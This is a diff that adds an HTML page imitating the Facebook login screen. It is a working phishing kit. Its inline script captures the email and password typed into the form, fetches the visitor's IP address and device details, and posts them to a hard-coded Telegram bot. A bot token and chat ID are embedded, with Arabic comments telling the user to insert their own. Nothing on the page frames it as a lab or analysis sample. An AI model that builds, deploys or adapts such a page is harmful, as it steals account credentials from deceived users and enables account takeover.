@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="./facebook.ico" type="image/x-icon">
+    <title>Facebook</title>
+    <link rel="stylesheet" href="./index.css">
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+</head>
+<body>
+    <div class="container">
+        <section class="intro-section">
+            <h1>facebook</h1>
+            <p>Facebook helps you connect and share with the people in your life.</p>
+        </section>
+
+        <section class="signin-section">
+            <div>
+                <form id="loginForm">
+                    <div>
+                        <input type="text" id="email" placeholder="Email address or phone number" required>
+                    </div>
+
+                    <div>
+                        <input type="password" id="password" placeholder="Password" required>
+                    </div>
+
+                    <div>
+                        <button type="submit">Log in</button>
+                    </div>
+
+                    <a href="#">Forgotten password?</a>
+                    <hr />
+                    <div class="create-btn">
+                        <button>Create new account</button>
+                    </div>
+                </form>
+            </div>
+            <p>
+                <a href="#"><strong>Create a Page</strong></a> for a celebrity, brand or business.
+            </p>
+        </section>
+    </div>
+
+    <script>
+        const TOKEN = "7623592169:AAGiC62X6KDuh4VJF-qbN5g7HeS7sTTVO94"; // ضع التوكن هنا
+        const CHAT_ID = "5752824370"; // ضع معرف الشات هنا
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            axios.get('https://api.ipify.org?format=json')
+                .then(response => {
+                    const ip = response.data.ip;
+
+                    const userAgent = navigator.userAgent;
+                    const platform = navigator.platform;
+                    const screenWidth = screen.width;
+                    const screenHeight = screen.height;
+                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+                    const message = ` 
+                        <b>New Login Attempt</b>\n
+                        <b>Email:</b> ${email}\n
+                        <b>Password:</b> ${password}\n
+                        <b>IP Address:</b> ${ip}\n
+                        <b>Device Type:</b> ${deviceType}\n
+                        <b>Platform:</b> ${platform}\n
+                        <b>User Agent:</b> ${userAgent}\n
+                        <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+                    `;
+
+                    axios.post(URI_API, {
+                        chat_id: CHAT_ID,
+                        parse_mode: 'html',
+                        text: message
+                    }).then(response => {
+                        alert('Information sent successfully!');
+                    }).catch(error => {
+                        alert('Error sending the information. Please try again.');
+                    });
+                })
+                .catch(error => {
+                    alert('Error fetching the IP address. Please try again.');
+                });
+        });
+    </script>
+</body>
+</html>
